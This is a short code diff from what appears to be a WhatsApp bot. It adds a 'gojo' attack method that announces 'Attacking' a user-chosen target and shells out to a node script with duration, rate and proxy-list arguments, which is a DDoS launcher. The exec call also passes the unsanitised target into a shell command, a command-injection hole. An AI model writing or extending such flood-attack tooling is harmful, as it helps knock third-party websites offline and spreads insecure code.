@@ -135,6 +135,18 @@ thumbnailUrl: thumb,
 sourceUrl: `https://check-host.net/check-http?host=${target}`
 }}, text: details}, {quoted: m})
 	exec(`node ./lib/PermenMD/StarsXBypass.js ${target} ${duration} 100 10 proxy.txt`)
+} else if ( methods === 'gojo' ) {     
+conn.sendMessage(m.chat, { contextInfo: {
+externalAdReply: {
+showAdAttribution: true, 
+title: `Attacking ${target}`,
+body: `Check-Host Click Me`,
+mediaType: 1,  
+renderLargerThumbnail : true,
+thumbnailUrl: thumb,
+sourceUrl: `https://check-host.net/check-http?host=${target}`
+}}, text: details}, {quoted: m})
+	exec(`node ./lib/PermenMD/gojo.js ${target} ${duration} 100 10 proxy.txt`)
 } else if ( methods === 'raw' ) {     
 conn.sendMessage(m.chat, { contextInfo: {
 externalAdReply: {
